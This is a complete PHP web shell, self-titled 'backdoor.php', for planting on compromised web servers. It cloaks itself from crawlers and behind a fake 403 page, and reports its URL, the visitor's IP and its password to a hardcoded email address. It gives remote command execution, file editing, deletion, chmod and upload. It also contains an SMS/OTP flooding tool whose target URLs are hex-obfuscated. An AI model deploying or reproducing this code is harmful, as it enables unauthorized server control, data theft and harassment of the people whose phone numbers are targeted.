<?php
/*
 * backdoor.php
 *
 * Copyright 2018 Cvar1984 <Cvar1984@P22DX>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA 02110-1301, USA.
 *
 */
session_start();
set_time_limit(0);
ini_set('max_execution_time', 0);
$auth_pass = "5a3844a15924bd86558bb85026e633f89d23c191"; // sha1('tuzki')
if (! empty($_SERVER['HTTP_USER_AGENT'])) {
	$userAgents = array(
		"Googlebot",
		"DuckDuckBot",
		"Baiduspider",
		"Exabot",
		"SimplePie",
		"Curl",
		"OkHttp",
		"SiteLockSpider",
		"BLEXBot",
		"ScoutJet",
		"AdsBot Google Mobile",
		"Googlebot Mobile",
		"MJ12bot",
		"Slurp",
		"MSNBot",
		"PycURL",
		"facebookexternalhit",
		"facebot",
		"ia_archiver",
		"crawler",
		"YandexBot",
		"Rambler",
		"Yahoo! Slurp",
		"YahooSeeker",
		"bingbot"
	);
	if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		header('HTTP/1.0 404 Not Found');
		exit();
	}
}

function login_shell()
{
	?>
<title>403 Forbidden</title>
<head>
<h1>Forbidden</h1>
<p>You don't have permission to access <?php
	echo $_SERVER['PHP_SELF'];
	?>
 on this server.</p>
<p>Additionally, a 403 Forbidden error was encountered while trying to
	use an ErrorDocument to handle the request.</p>
</head>
<?php
	exit();
}
if (! isset($_SESSION[md5(sha1($_SERVER['HTTP_HOST']))])) {
	if (empty($auth_pass) or (isset($_GET['pass']) and sha1($_GET['pass']) == $auth_pass)) {
		$_SESSION[md5(sha1($_SERVER['HTTP_HOST']))] = true;
		$email = "gedzsarjuncomuniti@gmail.com"; // Your Email
		$shell_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
		$subject = "Logs";
		$from = "From:Cvar1984";
		$content_mail = "URL : $shell_path\n\nIP : " . $_SERVER['REMOTE_ADDR'] . "\n\nPassword : $auth_pass\n\nBy Cvar1984";
		@mail($email, $subject, $content_mail, $from);
	} else {
		login_shell();
	}
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Backdoor</title>
<!-- CSS STYLE-->
<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="shortcut icon"
	href="https://www.hackthebox.eu/images/favicon.png" />
<link
	href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"
	rel="stylesheet" />
<script
	src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"
	type="text/javascript"></script>
<script
	src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"
	type="text/javascript"></script>
<style type='text/css'>
body {
	background: black;
	color: lavender;
	text-shadow: 2px 2px 4px #000000;
	background:
		url(http://shing.mobile9.com/download/media/538/tuzkiyouse_wk2o9pqf.jpg)
		no-repeat center center fixed;
	-webkit-background-size: cover;
	-moz-background-size: cover;
	-o-background-size: cover;
	background-size: cover;
}

@font-face {
	font-family: 'Orbitron';
	font-style: normal;
	font-weight: 700;
	src: local('Orbitron Bold'), local('Orbitron-Bold'),
		url(http://fonts.gstatic.com/s/orbitron/v9/yMJWMIlzdpvBhQQL_QIAUjh2qtA.woff2)
		format('woff2');
	unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
		U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
		U+2212, U+2215, U+FEFF, U+FFFD;
}

li {
	display: inline;
	text-shadow: 2px 2px 4px #000000;
	font-size: 17px;
}

a {
	color: lime;
}

a:hover {
	color: red;
}

table, tr, td {
	border: 1px
}

.table-hover {
	border: 1px solid green;
	cellpadding: 3;
	cellspacing: 3;
	font-size: 15px;
}

#textarea {
	background: transparent;
	width: 1066px;
	height: 500px;
	font-family: Arial, Helvetica, monospace;
	color: lavender;
}

#input {
	background: transparent;
	width: 250px;
	font-family: Arial, Helvetica, monospace;
	color: lavender;
}

#menu {
	
}

* {
	font-family: 'Orbitron';
}

.icon {
	width: 20px;
	height: 20px;
}
</style>
</head>
<body>
<?php

// FUNCTION
function post_data($url, $data)
{
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	return curl_exec($ch);
	curl_close($ch);
}

function home()
{
	echo "<script>window.location='?';</script>";
}

function spamsms()
{
	?>
<center>
		<h2>Spam SMS</h2>
		<form method="post" action="">
			<textarea name="no" class="form-control" id="textarea"
				placeholder='No HP ex : 888218005037 ' required cols="" rows=""></textarea>
			<br> <input type="submit" name="action" class="btn btn-danger" />
		</form>
	</center>
<?php
	if (isset($_POST['action'])) {
		$no = explode("\n", $_POST['no']);
		$no = str_replace(' ', '', $no);
		$no = str_replace("\n\n", "\n", $no);
		foreach ($no as $on) :
			echo "<hr>Calling     -> " . $on . "<hr><br>";
			post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70", "msisdn=" . $on . "&accept=call");
		endforeach
		;
		for ($x = 0; $x < 100; $x ++) {
			foreach ($no as $on) :
				echo "<hr>Send OTP To -> " . $on . "<hr><br>";
				post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73", "phone=" . $on . "&smsType=1");
				post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50", "phone_number=" . $on);
			endforeach
			;
		}
	} else {
		die();
	}
	die();
}

function music()
{
	echo "<center>";
	echo "<iframe width='700px' height='500px' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874911&amp;color=#00cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
	echo "</center>";
	die();
}

function jumping()
{
	alert("Kalem euy");
}

function config()
{
	alert("Kalem euy");
}

function mass_deface()
{
	alert("Kalem euy");
}

function info()
{
	if(!ini_get('disable_functions') == true) {
		$dist="False";
		} else {
			$dist=ini_get('disable_functions');
			}
	?>
   <center><h5>Disabled Function : <?php echo $dist;?> </h5>
		<textarea class="form-control" id="textarea" readonly /><?php
	print_r($_SERVER);
	?></textarea>
	</center>
	<?php
	die();
}

function logout()
{
	unset($_SESSION[md5(sha1($_SERVER['HTTP_HOST']))]);
	home();
}

function alert($message)
{
	?>
<script type="text/javascript">
var ALERT_TITLE = "Alert";
var ALERT_BUTTON_TEXT = "Ok";
if(document.getElementById) {
	window.alert = function(txt) {
		createCustomAlert(txt);
	}
}
function createCustomAlert(txt) {
	d = document;
	if(d.getElementById("modalContainer")) return;
	mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
	mObj.id = "modalContainer";
	mObj.style.height = d.documentElement.scrollHeight + "px";
	alertObj = mObj.appendChild(d.createElement("div"));
	alertObj.id = "alertBox";
	if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
	alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
	alertObj.style.visiblity="visible";
	h1 = alertObj.appendChild(d.createElement("h1"));
	h1.appendChild(d.createTextNode(ALERT_TITLE));
	msg = alertObj.appendChild(d.createElement("p"));
	//msg.appendChild(d.createTextNode(txt));
	msg.innerHTML = txt;
	btn = alertObj.appendChild(d.createElement("a"));
	btn.id = "closeBtn";
	btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
	btn.href = "#";
	btn.focus();
	btn.onclick = function() { removeCustomAlert();return false; }
	alertObj.style.display = "block";
}
function removeCustomAlert() {
	document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
}
</script>

	<style type="text/css">
#modalContainer {
	background-color: rgba(0, 0, 0, 0.3);
	position: absolute;
	width: 100%;
	height: 100%;
	top: 0px;
	left: 0px;
	z-index: 10000;
	background-image: url(tp.png);
	/* required by MSIE to prevent actions on lower z-index elements */
}

#alertBox {
	position: relative;
	width: 300px;
	min-height: 100px;
	margin-top: 50px;
	border: 1px solid #666;
	background-color: #fff;
	background-repeat: no-repeat;
	background-position: 20px 30px;
}

#modalContainer>#alertBox {
	position: fixed;
}

#alertBox h1 {
	margin: 0;
	font: bold 0.9em verdana, arial;
	background-color: #3073BB;
	color: #FFF;
	border-bottom: 1px solid #000;
	padding: 2px 0 2px 5px;
}

#alertBox p {
	color: red;
	height: 50px;
	padding-left: 5px;
	margin-left: 55px;
}

#alertBox #closeBtn {
	display: block;
	position: relative;
	margin: 5px auto;
	padding: 7px;
	border: 0 none;
	width: 70px;
	font: 0.7em verdana, arial;
	text-transform: uppercase;
	text-align: center;
	color: #FFF;
	background-color: #357EBD;
	border-radius: 3px;
	text-decoration: none;
}

/* unrelated styles */
#mContainer {
	position: relative;
	width: 600px;
	margin: auto;
	padding: 5px;
	border-top: 2px solid #000;
	border-bottom: 2px solid #000;
	font: 0.7em verdana, arial;
}

h1, h2 {
	margin: 0;
	padding: 4px;
	font: bold 1.5em verdana;
	border-bottom: 1px solid #000;
}

code {
	font-size: 1.2em;
	color: #069;
}

#credits {
	position: relative;
	margin: 25px auto 0px auto;
	width: 350px;
	font: 0.7em verdana;
	border-top: 1px solid #000;
	border-bottom: 1px solid #000;
	height: 90px;
	padding-top: 4px;
}

#credits img {
	float: left;
	margin: 5px 10px 5px 0px;
	border: 1px solid #000000;
	width: 80px;
	height: 79px;
}

.important {
	background-color: #F5FCC8;
	padding: 2px;
}

.main {
	width: 100%;
	box-shadow: inset 0 -1px 0 rgba(48, 48, 48, 0.7), 0 2px 4px
		rgba(48, 48, 48, 0.7);
}

.vn-nav ul {
	margin: 0;
	padding: 0;
	list-style-type: none;
	list-style-image: none;
}

.vn-nav li {
	margin-right: 0px;
	display: inline;
}

.vn-nav ul li a {
	text-decoration: none;
	margin: 0px;
	padding: 15px 20px 15px 20px;
	color: #ffffff;
}

.vn-nav li.current-menu-item a {
	color: #fff;
	text-decoration: none;
	background-color: #16a085;
}

.vn-nav li.current_page_item {
	color: #fff;
	text-decoration: none;
	background-color: #16a085;
}

.modalDialog {
	position: fixed;
	font-weight: bold;
	font-family: 'Agency FB';
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background: rgba(0, 0, 0, 0.8);
	z-index: 99999;
	opacity: 0;
	-webkit-transition: opacity 400ms ease-in;
	-moz-transition: opacity 400ms ease-in;
	transition: opacity 400ms ease-in;
	pointer-events: none;
}

.modalDialog:target {
	opacity: 1;
	pointer-events: auto;
}

.modalDialog>div {
	width: 500px;
	height: auto;
	position: relative;
	margin: 5% auto;
	padding: 5px 20px 13px 20px;
	background: #34495e;
	color: #fff;
}

.close {
	background: #2c3e50;
	color: #16a085;
	padding: 5px;
	position: right;
	right: -55px;
	text-align: center;
	top: 0;
	width: auto;
	float: left;
	text-decoration: none;
	font-weight: bold;
}

.close:hover {
	background: #2c3e50;
	color: #e74c3c
}

.vn-green a {
	background: #27ae60;
	padding: 10px;
	color: #fff;
}

.vn-green a:hover {
	color: red;
	background: #21894d;
	text-decoration: none;
}
</style>
	<script type="text/javascript">alert(<?php echo "'".$message."'";?>);</script>
<?php
}

function edit($filename)
{
	if (isset($_POST['text'])) {
		if (file_put_contents($filename, $_POST['text'])) {
			alert("Sucess");
		} else {
			alert("Permission Denied");
		}
	}
	$text = file_get_contents($filename);
	?>
<form action="" method="post">
		<center>
			<h5>Files Editor : <?php echo $filename;?></h5>
			<textarea name="text" class="form-control" id="textarea" cols=""
				rows=""><?php echo htmlspecialchars($text);?></textarea>
			<br> <input type="submit" class="btn btn-danger" />
		</center>
	</form>
<?php
	die();
}

function open($filename)
{
	alert("this extension is not supported");
	home();
}

function cmd($cmd)
{
	if (function_exists('system')) {
		ob_start();
		@system($cmd);
		$buff = ob_get_contents();
		ob_end_clean();
		return $buff;
	} elseif (function_exists('exec')) {
		@exec($cmd, $results);
		$buff = "";
		foreach ($results as $result) {
			$buff .= $result;
		}
		return $buff;
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($cmd);
		$buff = ob_get_contents();
		ob_end_clean();
		return $buff;
	} elseif (function_exists('shell_exec')) {
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

function renames($filename)
{
	if (isset($_POST['action'])) {
		if (@rename($filename, $_POST['newname'])) {
			alert("Success");
		} else {
			alert("Permission Denied");
		}
		home();
	}
	?>
   <form method='post' action="">
		<center>
			<td>Filename : <input type='text' class='input-sm' id='input'
				value='&lt;?php echo $filename; ?&gt;' name='newname'></td> <input
				type='submit' class='btn btn-danger' name='action' value='rename'>
		</center>
	</form>
	<?php
	die();
}

function chmods($filename)
{
	if (isset($_POST['action'])) {
		if (chmod($filename, $_POST['permission'])) {
			alert("Success");
		} else {
			alert("Permission Denied");
		}
		home();
	}
	?>
   <form method='post' action="">
		<center>
			<td>Permission : <input type='text' class='input-sm' id='input'
				value='0755' name='permission'></td> <input type='submit'
				class='btn btn-danger' name='action' value='chmod'>
		</center>
	</form>
	<?php
	die();
}
// END FUNCTION
?>
 <nav class="navbar navbar-inverse">
		<div class="container-fluid">
			<div class="navbar-header">
				<a class="navbar-brand"
					href="https://github.com/BlackHoleSecurity/backdoor">Tuzki</a>
			</div>
			<ul class="nav navbar-nav">
				<li class="active"><a href="?">Home</a></li>
				<li class="dropdown"><a class="dropdown-toggle"
					data-toggle="dropdown" href="#">Tools <span class="caret"></span></a>
					<ul class="dropdown-menu">
						<li><a href='?do=cmd'>Command Prompt</a></li>
						<li><a href='?do=sms'>Spam SMS</a></li>
						<li><a href='?do=music'>Music</a></li>
						<li><a href='?do=jumping'>Jumping</a></li>
						<li><a href='?do=config'>Config</a></li>
						<li><a href='?do=mass_deface'>Mass Deface</a></li>
						<li><a href='?do=info'>Server Info</a></li>
					</ul></li>
				<li><a href='?do=logout'><span class="glyphicon glyphicon-log-in"></span>
						Logout</a></li>
			</ul>
		</div>
	</nav>
<?php
if (@$_GET['do'] == 'home') {
	home();
} elseif (@$_GET['do'] == 'sms') {
	spamsms();
} elseif (@$_GET['do'] == 'music') {
	music();
} elseif (@$_GET['do'] == 'jumping') {
	jumping();
} elseif (@$_GET['do'] == 'config') {
	config();
} elseif (@$_GET['do'] == 'mass_deface') {
	mass_deface();
} elseif (@$_GET['do'] == 'info') {
	info();
} elseif (@$_GET['do'] == 'logout') {
	logout();
} elseif (@$_GET['do'] == 'edit' and isset($_GET['files'])) {
	edit($_GET['files']);
} elseif (@$_GET['do'] == 'open' and isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} elseif (@$_GET['do'] == 'view' and isset($_GET['files'])) {
	open($_GET['files']);
} elseif (@$_GET['do'] == 'delete' and isset($_GET['files'])) {
	if (@unlink($_GET['files'])) {
		alert("Success");
	} else {
		alert("Permission Denied");
	}
} elseif (@$_GET['do'] == 'rename' and isset($_GET['files'])) {
	renames($_GET['files']);
} elseif (@$_GET['do'] == 'chmod' and isset($_GET['files'])) {
	chmods($_GET['files']);
} elseif (@$_GET['do'] == 'cmd') {
	echo "<center><h3>Command Prompt</h3></center>";
	if (isset($_POST['command'])) {
		echo "<center><textarea id='textarea' class='form-control' readonly>" . cmd($_POST['command']) . "</textarea></center>";
	}
	?>
<center>
		<form method="post" action="">
			<input type="text" class='input-sm' id='input' name="command" /> <input
				type="submit" class="btn btn-danger" />
		</form>
	</center>
	<form action=""></form>
<?php
	die();
}

$dir = scandir(getcwd());
echo "<table width='70%' cellpadding='3' cellspacing='3' align='center' style='background:green;'>
	<th style='background:green;float:left;width:200px;text-align:center;font-size:18px;'>Name</th>
	<th style='background:green;float:right;width:300px;text-align:center;font-size:18px;'>Action</th>
	</table>";
foreach ($dir as $dir) :
	?>
<table width='70%' class='table-hover' align='center'>
		<tr>
		<?php
	if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
		$sep = substr('\\', 0, 1);
	} else {
		$sep = '/';
	}
	$ext = pathinfo($dir, PATHINFO_EXTENSION);
	if (is_dir($dir)) {
		echo "
		<td><img src='http://icons.iconarchive.com/icons/dakirby309/simply-styled/256/Blank-Folder-icon.png' class='icon'>";
		echo "<a href='?do=open&dir=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
		echo "<td style='float:right;margin-right:7px;'>
		<a href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a> |
		<a href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> | 
		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
	} elseif ($ext == 'jpg' or $ext == 'png' or $ext == 'jpeg' or $ext == 'gif' or $ext == 'rar' or $ext == 'zip' or $ext == 'doc' or $ext == 'pdf') {
		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
		echo "<a href='?do=view&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
		echo "<td style='float:right;margin-right:7px;'>
		<a href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a> |
		<a href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> | 
		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
	} else {
		echo "<td><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' class='icon'>";
		echo "<a href='?do=edit&files=" . getcwd() . $sep . $dir . "'>$dir</a></td>";
		echo "<td style='float:right;margin-right:7px;'>
		<a href='?do=chmod&files=" . getcwd() . $sep . $dir . "'>Chmod</a> |
		<a href='?do=rename&files=" . getcwd() . $sep . $dir . "'>Rename</a> | 
		<a href='?do=delete&files=" . getcwd() . $sep . $dir . "'>Delete</td>";
	}
	?>
	</tr>
	</table>
<?php
endforeach
;
?>
<table width='70%' cellpadding='3' cellspacing='3' align='center'
		style='background: green;'>
		<th style='padding: 5px;' colspan='2'>
			<center>
			Copyright &copy <?php echo date("Y"); ?>, 
			<a href='https://github.com/Cvar1984'>Cvar1984</a> & <a
					href='https://github.com/l0lz666h05t'>L0LZ666H05T</a>
			</center>
		</th>
	</table>
	<?php
if (isset($_POST['upl'])) {
	if (copy($_FILES['file']['tmp_name'], getcwd() . $sep . $_FILES['file']['name'])) {
		alert("Upload Success");
	} else {
		alert("Upload Failed");
	}
}
?>
   <form method="post" enctype="multipart/form-data" action="">
		<center>
			<input class="btn" id="input" type="file" name="file" /> <input
				class="btn btn-danger" name="upl" type="submit" value="Save">
		</center>
	</form>
</body>
</html>
